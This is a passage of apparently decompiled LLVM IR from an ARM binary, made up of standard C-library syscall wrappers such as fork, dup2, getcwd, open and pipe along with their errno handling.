  %v1_f524 = phi i32 [ %v1_f4c4.v6_f4c4.v6_f4cc.v6_f4d4, %dec_label_pc_f4e8 ], [ 0, %bb92 ], [ %v1_f51c, %dec_label_pc_f518 ], [ %v2_f518, %bb97 ], [ %v3_f47c, %.thread72 ], [ %v1_f470, %bb83 ]
  br i1 %v1_f464, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_f524 = sub i32 0, %v1_f524
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_f528 = phi i32 [ %v1_f524, %.thread6 ], [ %v2_f524, %bb98 ]
  ret i32 %v1_f528

dec_label_pc_f52c:                                ; preds = %entry
  %v0_f52c = load i32, i32* @lr, align 4
  %v0_f530 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_f52c)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_f508, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_f4e8, { 1, 0, 2 }
  uselistorder i32 %v7_f4e0, { 1, 0 }
  uselistorder i32 %v3_f4dc, { 1, 0 }
  uselistorder i32 %v1_f4c4.v6_f4c4.v6_f4cc.v6_f4d4, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_f4d0, { 1, 0 }
  uselistorder i32 %v4_f4c8, { 1, 0 }
  uselistorder i32 %v4_f4c0, { 1, 0 }
  uselistorder i32 %v6_f4e0, { 3, 0, 2, 1 }
  uselistorder i32 %v2_f4b0, { 1, 0 }
  uselistorder i32 %v1_f4a4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_f4a0, { 1, 0, 3, 2 }
  uselistorder i32 %v4_f490, { 1, 0, 3, 2 }
  uselistorder i32 %v0_f49c.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_f470, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_f478, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_f518, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_f50c, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_f4b8, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @__aeabi_ldiv0() local_unnamed_addr {
entry:
  %v1_f53c = load i32, i32* @r0, align 4
  ret i32 %v1_f53c
}

define i32 @__muldi3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_f54c = udiv i32 %arg1, 65536
  %v3_f550 = udiv i32 %arg3, 65536
  %tmp = mul i32 %v3_f54c, -65536
  %v5_f554 = add i32 %tmp, -1
  %v6_f554 = and i32 %v5_f554, %arg1
  %tmp10 = mul i32 %v3_f550, -65536
  %v5_f558 = add i32 %tmp10, -1
  %v6_f558 = and i32 %v5_f558, %arg3
  %v2_f55c = mul i32 %v6_f558, %v6_f554
  %v2_f560 = mul i32 %v6_f558, %v3_f54c
  %v2_f564 = mul i32 %v6_f554, %v3_f550
  %v2_f56c = add i32 %v2_f560, %v2_f564
  %v3_f56c = icmp ult i32 %v2_f56c, %v2_f560
  br i1 %v3_f56c, label %bb, label %bb9

bb:                                               ; preds = %entry
  br label %bb9

bb9:                                              ; preds = %entry, %bb
  %v4_f574 = mul i32 %v2_f56c, 65536
  %v5_f574 = add i32 %v4_f574, %v2_f55c
  ret i32 %v5_f574

; uselistorder directives
  uselistorder i32 %v2_f560, { 1, 0 }
  uselistorder i32 %v6_f554, { 1, 0 }
  uselistorder i32 %v3_f550, { 1, 0 }
  uselistorder i32 %v3_f54c, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_f590 = call i32 @vfork()
  store i32 %v0_f590, i32* @r0, align 4
  %v2_f594 = icmp ugt i32 %v0_f590, -4097
  br i1 %v2_f594, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_f5a8, %entry
  %merge = phi i32 [ %v0_f590, %entry ], [ %v0_f5a8, %dec_label_pc_f5a8 ]
  ret i32 %merge

bb1:                                              ; preds = %entry
  %v4_f5a0 = icmp eq i32 %v0_f590, -38
  br i1 %v4_f5a0, label %dec_label_pc_f5a8, label %bb2

dec_label_pc_f5a8:                                ; preds = %bb1
  %v0_f5a8 = call i32 @fork()
  store i32 %v0_f5a8, i32* @r0, align 4
  %v2_f5ac = icmp ugt i32 %v0_f5a8, -4097
  br i1 %v2_f5ac, label %bb2, label %bb

bb2:                                              ; preds = %bb1, %dec_label_pc_f5a8
  %v0_f5b4 = call i32 @__syscall_error()
  ret i32 %v0_f5b4

; uselistorder directives
  uselistorder i32 %v0_f5a8, { 1, 2, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_f5c0 = load i32, i32* @r2, align 4
  store i32 %arg2, i32* @ip, align 4
  %v1_f5d0 = add i32 %arg2, -12
  store i32 %v6_f5c0, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_f5d0, 2
  br i1 %tmp, label %dec_label_pc_f5f8, label %dec_label_pc_f5f0

dec_label_pc_f5f0:                                ; preds = %entry
  %v0_f5f0 = call i32 @__GI_fcntl64()
  br label %dec_label_pc_f624

dec_label_pc_f5f8:                                ; preds = %entry
  %v2_f600 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_f600, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_f600, -4095
  br i1 %tmp8, label %dec_label_pc_f624, label %dec_label_pc_f610

dec_label_pc_f610:                                ; preds = %dec_label_pc_f5f8
  %v0_f610 = call i32 @__errno_location()
  %v0_f614 = load i32, i32* %r4.global-to-local, align 4
  %v1_f614 = sub i32 0, %v0_f614
  %v2_f618 = inttoptr i32 %v0_f610 to i32*
  store i32 %v1_f614, i32* %v2_f618, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f624

dec_label_pc_f624:                                ; preds = %dec_label_pc_f610, %dec_label_pc_f5f8, %dec_label_pc_f5f0
  %storemerge = phi i32 [ %v0_f5f0, %dec_label_pc_f5f0 ], [ %v2_f600, %dec_label_pc_f5f8 ], [ -1, %dec_label_pc_f610 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_f600, { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 2, 1 }
}

define i32 @__GI_fcntl64() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_f654 = load i32, i32* @r0, align 4
  store i32 %v0_f654, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f654, -4095
  br i1 %tmp, label %dec_label_pc_f670, label %dec_label_pc_f660

dec_label_pc_f660:                                ; preds = %entry
  %v0_f660 = call i32 @__errno_location()
  %v0_f664 = load i32, i32* %r4.global-to-local, align 4
  %v1_f664 = sub i32 0, %v0_f664
  %v2_f668 = inttoptr i32 %v0_f660 to i32*
  store i32 %v1_f664, i32* %v2_f668, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f670

dec_label_pc_f670:                                ; preds = %entry, %dec_label_pc_f660
  %v0_f670 = phi i32 [ %v0_f654, %entry ], [ -1, %dec_label_pc_f660 ]
  ret i32 %v0_f670

; uselistorder directives
  uselistorder i32 %v0_f654, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f670, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @chdir() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f6ac = load i32, i32* @r4, align 4
  store i32 %v3_f6ac, i32* %stack_var_-8, align 4
  %v0_f6b0 = call i32 @chdir()
  store i32 %v0_f6b0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f6b0, -4095
  br i1 %tmp, label %dec_label_pc_f6d0, label %dec_label_pc_f6c0

dec_label_pc_f6c0:                                ; preds = %entry
  %v0_f6c0 = call i32 @__errno_location()
  %v0_f6c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_f6c4 = sub i32 0, %v0_f6c4
  %v2_f6c8 = inttoptr i32 %v0_f6c0 to i32*
  store i32 %v1_f6c4, i32* %v2_f6c8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f6d0

dec_label_pc_f6d0:                                ; preds = %entry, %dec_label_pc_f6c0
  %v0_f6d0 = phi i32 [ %v0_f6b0, %entry ], [ -1, %dec_label_pc_f6c0 ]
  %v2_f6d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f6d4, i32* @r4, align 4
  ret i32 %v0_f6d0

; uselistorder directives
  uselistorder i32 %v0_f6b0, { 1, 0, 2 }
  uselistorder i32 ()* @chdir, { 1, 0 }
  uselistorder label %dec_label_pc_f6d0, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f6d8 = load i32, i32* @r4, align 4
  store i32 %v3_f6d8, i32* %stack_var_-8, align 4
  %v1_f6dc = call i32 @close(i32 %arg1)
  store i32 %v1_f6dc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_f6dc, -4095
  br i1 %tmp, label %dec_label_pc_f6fc, label %dec_label_pc_f6ec

dec_label_pc_f6ec:                                ; preds = %entry
  %v0_f6ec = call i32 @__errno_location()
  %v0_f6f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_f6f0 = sub i32 0, %v0_f6f0
  %v2_f6f4 = inttoptr i32 %v0_f6ec to i32*
  store i32 %v1_f6f0, i32* %v2_f6f4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f6fc

dec_label_pc_f6fc:                                ; preds = %entry, %dec_label_pc_f6ec
  %v0_f6fc = phi i32 [ %v1_f6dc, %entry ], [ -1, %dec_label_pc_f6ec ]
  %v2_f700 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f700, i32* @r4, align 4
  ret i32 %v0_f6fc

; uselistorder directives
  uselistorder i32 %v1_f6dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f6fc, { 1, 0 }
}

define i32 @dup2() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f704 = load i32, i32* @r4, align 4
  store i32 %v3_f704, i32* %stack_var_-8, align 4
  %v0_f708 = call i32 @dup2()
  store i32 %v0_f708, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f708, -4095
  br i1 %tmp, label %dec_label_pc_f728, label %dec_label_pc_f718

dec_label_pc_f718:                                ; preds = %entry
  %v0_f718 = call i32 @__errno_location()
  %v0_f71c = load i32, i32* %r4.global-to-local, align 4
  %v1_f71c = sub i32 0, %v0_f71c
  %v2_f720 = inttoptr i32 %v0_f718 to i32*
  store i32 %v1_f71c, i32* %v2_f720, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f728

dec_label_pc_f728:                                ; preds = %entry, %dec_label_pc_f718
  %v0_f728 = phi i32 [ %v0_f708, %entry ], [ -1, %dec_label_pc_f718 ]
  %v2_f72c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f72c, i32* @r4, align 4
  ret i32 %v0_f728

; uselistorder directives
  uselistorder i32 %v0_f708, { 1, 0, 2 }
  uselistorder i32 ()* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f728, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f730 = load i32, i32* @r4, align 4
  store i32 %v3_f730, i32* %stack_var_-8, align 4
  %v0_f734 = call i32 @fork()
  store i32 %v0_f734, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f734, -4095
  br i1 %tmp, label %dec_label_pc_f754, label %dec_label_pc_f744

dec_label_pc_f744:                                ; preds = %entry
  %v0_f744 = call i32 @__errno_location()
  %v0_f748 = load i32, i32* %r4.global-to-local, align 4
  %v1_f748 = sub i32 0, %v0_f748
  %v2_f74c = inttoptr i32 %v0_f744 to i32*
  store i32 %v1_f748, i32* %v2_f74c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f754

dec_label_pc_f754:                                ; preds = %entry, %dec_label_pc_f744
  %v0_f754 = phi i32 [ %v0_f734, %entry ], [ -1, %dec_label_pc_f744 ]
  %v2_f758 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f758, i32* @r4, align 4
  ret i32 %v0_f754

; uselistorder directives
  uselistorder i32 %v0_f734, { 1, 0, 2 }
  uselistorder i32 ()* @fork, { 1, 0 }
  uselistorder label %dec_label_pc_f754, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_f75c = load i32, i32* @r4, align 4
  store i32 %v3_f75c, i32* %stack_var_-20, align 4
  %v6_f75c = load i32, i32* @r5, align 4
  %v9_f75c = load i32, i32* @r6, align 4
  %v12_f75c = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r7, align 4
  %v2_f760 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r5, align 4
  %v2_f76c = icmp eq i32 %arg1, 0
  br i1 %v2_f760, label %dec_label_pc_f76c, label %dec_label_pc_f79c

dec_label_pc_f76c:                                ; preds = %entry
  br i1 %v2_f76c, label %dec_label_pc_f788, label %dec_label_pc_f774

dec_label_pc_f774:                                ; preds = %dec_label_pc_f76c
  %v0_f774 = call i32 @__errno_location()
  %v0_f778 = load i32, i32* @r7, align 4
  store i32 %v0_f778, i32* @r5, align 4
  %v2_f780 = inttoptr i32 %v0_f774 to i32*
  store i32 22, i32* %v2_f780, align 4
  br label %dec_label_pc_f82c

dec_label_pc_f788:                                ; preds = %dec_label_pc_f76c
  %v0_f788 = call i32 @__GI_getpagesize()
  %v5_f790 = icmp slt i32 %v0_f788, 4096
  br i1 %v5_f790, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_f788
  store i32 %v0_f788, i32* @r4, align 4
  br label %dec_label_pc_f7ac

bb15:                                             ; preds = %dec_label_pc_f788
  store i32 4096, i32* @r4, align 4
  br label %dec_label_pc_f7ac

dec_label_pc_f79c:                                ; preds = %entry
  store i32 %arg2, i32* @r4, align 4
  br i1 %v2_f76c, label %dec_label_pc_f7ac, label %bb16

bb16:                                             ; preds = %dec_label_pc_f79c
  store i32 %arg1, i32* @r6, align 4
  br label %dec_label_pc_f7bc

dec_label_pc_f7ac:                                ; preds = %dec_label_pc_f79c, %bb, %bb15
  %v0_f7ac = phi i32 [ %v0_f788, %bb ], [ 4096, %bb15 ], [ %arg2, %dec_label_pc_f79c ]
  %v1_f7b0 = call i32 @malloc(i32 %v0_f7ac)
  store i32 %v1_f7b0, i32* @r6, align 4
  %v2_f7b4 = icmp eq i32 %v1_f7b0, 0
  br i1 %v2_f7b4, label %dec_label_pc_f828, label %dec_label_pc_f7ac.dec_label_pc_f7bc_crit_edge

dec_label_pc_f7ac.dec_label_pc_f7bc_crit_edge:    ; preds = %dec_label_pc_f7ac
  %v0_f7bc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_f7bc

dec_label_pc_f7bc:                                ; preds = %bb16, %dec_label_pc_f7ac.dec_label_pc_f7bc_crit_edge
  %v0_f7c0 = phi i32 [ %v1_f7b0, %dec_label_pc_f7ac.dec_label_pc_f7bc_crit_edge ], [ %arg1, %bb16 ]
  %v0_f7bc = phi i32 [ %v0_f7bc.pre, %dec_label_pc_f7ac.dec_label_pc_f7bc_crit_edge ], [ %arg2, %bb16 ]
  %v2_f7c4 = call i32 @getcwd(i32 %v0_f7c0, i32 %v0_f7bc)
  store i32 %v2_f7c4, i32* @r4, align 4
  %tmp = icmp ult i32 %v2_f7c4, -4095
  br i1 %tmp, label %dec_label_pc_f7e4, label %dec_label_pc_f7d4

dec_label_pc_f7d4:                                ; preds = %dec_label_pc_f7bc
  %v0_f7d4 = call i32 @__errno_location()
  %v0_f7d8 = load i32, i32* @r4, align 4
  %v1_f7d8 = sub i32 0, %v0_f7d8
  %v2_f7dc = inttoptr i32 %v0_f7d4 to i32*
  store i32 %v1_f7d8, i32* %v2_f7dc, align 4
  br label %dec_label_pc_f814

dec_label_pc_f7e4:                                ; preds = %dec_label_pc_f7bc
  %v1_f7e4 = icmp slt i32 %v2_f7c4, 0
  br i1 %v1_f7e4, label %dec_label_pc_f814, label %dec_label_pc_f7ec

dec_label_pc_f7ec:                                ; preds = %dec_label_pc_f7e4
  %v0_f7ec = load i32, i32* @r5, align 4
  %v2_f7ec = icmp eq i32 %v0_f7ec, 0
  br i1 %v2_f7ec, label %bb17, label %dec_label_pc_f808.thread7

dec_label_pc_f808.thread7:                        ; preds = %dec_label_pc_f7ec
  br label %dec_label_pc_f82c

bb17:                                             ; preds = %dec_label_pc_f7ec
  %v1_f7f0 = load i32, i32* @r7, align 4
  %v3_f7f0 = icmp eq i32 %v1_f7f0, 0
  br i1 %v3_f7f0, label %dec_label_pc_f808, label %dec_label_pc_f808.thread

dec_label_pc_f808.thread:                         ; preds = %bb17
  br label %bb18

dec_label_pc_f808:                                ; preds = %bb17
  %v0_f7fc = load i32, i32* @r6, align 4
  %v2_f800 = call i32 @realloc(i32 %v0_f7fc, i32 %v2_f7c4)
  store i32 %v2_f800, i32* @r5, align 4
  %v2_f808 = icmp eq i32 %v2_f800, 0
  br i1 %v2_f808, label %bb18, label %dec_label_pc_f82c

bb18:                                             ; preds = %dec_label_pc_f808.thread, %dec_label_pc_f808
  %v1_f80c = load i32, i32* @r6, align 4
  store i32 %v1_f80c, i32* @r5, align 4
  br label %dec_label_pc_f82c

dec_label_pc_f814:                                ; preds = %dec_label_pc_f7e4, %dec_label_pc_f7d4
  %v0_f814 = load i32, i32* @r5, align 4
  %v2_f814 = icmp eq i32 %v0_f814, 0
  br i1 %v2_f814, label %dec_label_pc_f81c, label %dec_label_pc_f828

dec_label_pc_f81c:                                ; preds = %dec_label_pc_f814
  %v0_f81c = load i32, i32* @r6, align 4
  store i32 %v0_f81c, i32* @r0, align 4
  %v0_f820 = call i32 @free()
  br label %dec_label_pc_f82c

dec_label_pc_f828:                                ; preds = %dec_label_pc_f814, %dec_label_pc_f7ac
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_f82c

dec_label_pc_f82c:                                ; preds = %dec_label_pc_f808.thread7, %bb18, %dec_label_pc_f808, %dec_label_pc_f81c, %dec_label_pc_f774, %dec_label_pc_f828
  %v0_f82c = load i32, i32* @r5, align 4
  %v2_f830 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_f830, i32* @r4, align 4
  store i32 %v6_f75c, i32* @r5, align 4
  store i32 %v9_f75c, i32* @r6, align 4
  store i32 %v12_f75c, i32* @r7, align 4
  ret i32 %v0_f82c

; uselistorder directives
  uselistorder i32 %v2_f7c4, { 2, 1, 0, 3 }
  uselistorder i32 %v0_f788, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_f82c, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_f7bc, { 1, 0 }
  uselistorder label %dec_label_pc_f7ac, { 0, 2, 1 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_f838 = ptrtoint i32* %stack_var_-12 to i32
  %v2_f844 = call i32 @getrlimit(i32 7, i32 %v2_f838)
  %v1_f848 = icmp slt i32 %v2_f844, 0
  br i1 %v1_f848, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v5_f850 = load i32, i32* %stack_var_-12, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_f858 = phi i32 [ 256, %entry ], [ %v5_f850, %bb ]
  ret i32 %v5_f858

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v2_f860 = load i32, i32* @global_var_2a3b8.578, align 4
  %v2_f864 = icmp eq i32 %v2_f860, 0
  br i1 %v2_f864, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_f86c = phi i32 [ %v2_f860, %entry ], [ 4096, %bb ]
  ret i32 %v1_f86c

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f874 = load i32, i32* @r4, align 4
  store i32 %v3_f874, i32* %stack_var_-8, align 4
  %v0_f878 = call i32 @getpid()
  store i32 %v0_f878, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f878, -4095
  br i1 %tmp, label %dec_label_pc_f898, label %dec_label_pc_f888

dec_label_pc_f888:                                ; preds = %entry
  %v0_f888 = call i32 @__errno_location()
  %v0_f88c = load i32, i32* %r4.global-to-local, align 4
  %v1_f88c = sub i32 0, %v0_f88c
  %v2_f890 = inttoptr i32 %v0_f888 to i32*
  store i32 %v1_f88c, i32* %v2_f890, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f898

dec_label_pc_f898:                                ; preds = %entry, %dec_label_pc_f888
  %v0_f898 = phi i32 [ %v0_f878, %entry ], [ -1, %dec_label_pc_f888 ]
  %v2_f89c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f89c, i32* @r4, align 4
  ret i32 %v0_f898

; uselistorder directives
  uselistorder i32 %v0_f878, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f898, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f8a0 = load i32, i32* @r4, align 4
  store i32 %v3_f8a0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_f8c4, label %dec_label_pc_f8b4

dec_label_pc_f8b4:                                ; preds = %entry
  %v0_f8b4 = call i32 @__errno_location()
  %v0_f8b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_f8b8 = sub i32 0, %v0_f8b8
  %v2_f8bc = inttoptr i32 %v0_f8b4 to i32*
  store i32 %v1_f8b8, i32* %v2_f8bc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_f8c8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f8c4

dec_label_pc_f8c4:                                ; preds = %entry, %dec_label_pc_f8b4
  %v2_f8c8 = phi i32 [ %v3_f8a0, %entry ], [ %v2_f8c8.pre, %dec_label_pc_f8b4 ]
  %v0_f8c4 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_f8b4 ]
  store i32 %v2_f8c8, i32* @r4, align 4
  ret i32 %v0_f8c4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f8c4, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_f8e8 = load i32, i32* @r0, align 4
  %v3_f8e8 = call i32 @ioctl(i32 %v0_f8e8, i32 %arg1, i32 %arg2)
  store i32 %v3_f8e8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_f8e8, -4095
  br i1 %tmp, label %dec_label_pc_f908, label %dec_label_pc_f8f8

dec_label_pc_f8f8:                                ; preds = %entry
  %v0_f8f8 = call i32 @__errno_location()
  %v0_f8fc = load i32, i32* %r4.global-to-local, align 4
  %v1_f8fc = sub i32 0, %v0_f8fc
  %v2_f900 = inttoptr i32 %v0_f8f8 to i32*
  store i32 %v1_f8fc, i32* %v2_f900, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f908

dec_label_pc_f908:                                ; preds = %entry, %dec_label_pc_f8f8
  %v0_f908 = phi i32 [ %v3_f8e8, %entry ], [ -1, %dec_label_pc_f8f8 ]
  ret i32 %v0_f908

; uselistorder directives
  uselistorder i32 %v3_f8e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f908, { 1, 0 }
}

define i32 @kill() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f91c = load i32, i32* @r4, align 4
  store i32 %v3_f91c, i32* %stack_var_-8, align 4
  %v0_f920 = call i32 @kill()
  store i32 %v0_f920, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f920, -4095
  br i1 %tmp, label %dec_label_pc_f940, label %dec_label_pc_f930

dec_label_pc_f930:                                ; preds = %entry
  %v0_f930 = call i32 @__errno_location()
  %v0_f934 = load i32, i32* %r4.global-to-local, align 4
  %v1_f934 = sub i32 0, %v0_f934
  %v2_f938 = inttoptr i32 %v0_f930 to i32*
  store i32 %v1_f934, i32* %v2_f938, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f940

dec_label_pc_f940:                                ; preds = %entry, %dec_label_pc_f930
  %v0_f940 = phi i32 [ %v0_f920, %entry ], [ -1, %dec_label_pc_f930 ]
  %v2_f944 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f944, i32* @r4, align 4
  ret i32 %v0_f940

; uselistorder directives
  uselistorder i32 %v0_f920, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f940, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_f958 = and i32 %arg2, 64
  %v2_f958 = icmp eq i32 %v1_f958, 0
  br i1 %v2_f958, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v6_f948 = load i32, i32* @r2, align 4
  %phitmp = urem i32 %v6_f948, 65536
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v0_f968 = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_f968, i32* @r2, align 4
  %v4_f970 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_f974 = icmp eq i32 %v4_f970, -4096
  store i1 %v7_f974, i1* @cpsr_z, align 1
  store i32 %v4_f970, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_f970, -4095
  br i1 %tmp, label %dec_label_pc_f990, label %dec_label_pc_f980

dec_label_pc_f980:                                ; preds = %.thread1
  %v0_f980 = call i32 @__errno_location()
  %v0_f984 = load i32, i32* %r4.global-to-local, align 4
  %v1_f984 = sub i32 0, %v0_f984
  %v2_f988 = inttoptr i32 %v0_f980 to i32*
  store i32 %v1_f984, i32* %v2_f988, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f990

dec_label_pc_f990:                                ; preds = %.thread1, %dec_label_pc_f980
  %v0_f990 = phi i32 [ %v4_f970, %.thread1 ], [ -1, %dec_label_pc_f980 ]
  ret i32 %v0_f990

; uselistorder directives
  uselistorder i32 %v4_f970, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_f990, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %v0_f9ac = load i32, i32* @r0, align 4
  %v2_f9ac = inttoptr i32 %v0_f9ac to i8*
  %v3_f9ac = call i32 @__libc_open(i8* %v2_f9ac, i32 577)
  %v0_f9b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f9b0, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v6_f9b0 = and i32 %v3_f9ac, 36
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v7_f9b0 = phi i32 [ %v3_f9ac, %entry ], [ %v6_f9b0, %bb ]
  ret i32 %v7_f9b0

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f9b4 = load i32, i32* @r4, align 4
  store i32 %v3_f9b4, i32* %stack_var_-8, align 4
  %v1_f9b8 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_f9b8 = call i32 @pipe([2 x i32] %v1_f9b8)
  store i32 %v2_f9b8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_f9b8, -4095
